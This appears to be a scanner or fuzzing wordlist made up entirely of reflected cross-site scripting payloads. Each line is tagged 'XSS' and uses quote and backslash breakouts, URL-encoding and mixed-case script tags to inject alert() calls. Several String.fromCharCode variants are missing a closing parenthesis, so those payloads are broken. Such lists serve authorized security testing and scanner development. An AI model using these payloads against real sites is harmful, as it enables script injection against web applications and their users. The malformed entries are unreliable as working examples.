+='%3e%3cscript%3ealert('XSS')%3c%2fscript%3e : XSS
+='%3e%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e : XSS
+="%3e%3c%3cscript%3ealert('XSS')%3c%2fscript%3e : XSS
+="%3e%3c%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e : XSS
+='%3e%3c%3cscript%3ealert('XSS')%3c%2fscript%3e : XSS
+='%3e%3c%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e : XSS
+\\><script>alert('XSS')</script> : XSS
+\\><ScRiPt>AlErT('XSS')</ScRiPt> : XSS
+=><><script>alert('XSS')</script> : XSS
+=><><ScRiPt>AlErT('XSS')</ScRiPt> : XSS
+=\\><script>alert('XSS')</script> : XSS
+=\\><ScRiPt>AlErT('XSS')</ScRiPt> : XSS
+=\><script>alert('XSS')</script> : XSS
+=\><ScRiPt>AlErT('XSS')</ScRiPt> : XSS
+=\\><<script>alert('XSS')</script> : XSS
+=\\><<ScRiPt>AlErT('XSS')</ScRiPt> : XSS
+=\><<script>alert('XSS')</script> : XSS
+=\><<ScRiPt>AlErT('XSS')</ScRiPt> : XSS
+"%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS
+"%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS
+=%3e%3c%3e%3cscript>alert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS
+=%3e%3c%3e%3cScRiPt>AlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS
+="%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS
+="%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS
+='%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS
+='%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS
+="%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS
+="%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS
+='%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS
+='%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS
+\\><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS
+\\><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS
+=><><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS
+=><><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS
+=\\><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS
+=\\><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS
+=\><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS
+=\><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS
+=\\><<script>alert(String.fromCharCode(88, 83, 83)</script> : XSS
+=\\><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS
+=\><<script>alert(String.fromCharCode(88, 83, 83)</script> : XSS
+=\><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS
+%5c%5c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS
+%5c%5c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS
+=%3e%3c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS
+=%3e%3c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS
+=%5c%5c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS
+=%5c%5c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS
+=%5c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS
+=%5c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS
+=%5c%5c%3e%3c%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS
+=%5c%5c%3e%3c%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS
+=%5c%3e%3c%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e : XSS
+=%5c%3e%3c%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e : XSS
+%5c%5c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS
+%5c%5c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS
+=%3e%3c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS
+=%3e%3c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS
+=%5c%5c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS
+=%5c%5c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS
+=%5c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS
+=%5c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS
+=%5c%5c%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS
+=%5c%5c%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS
+=%5c%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS
+=%5c%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS
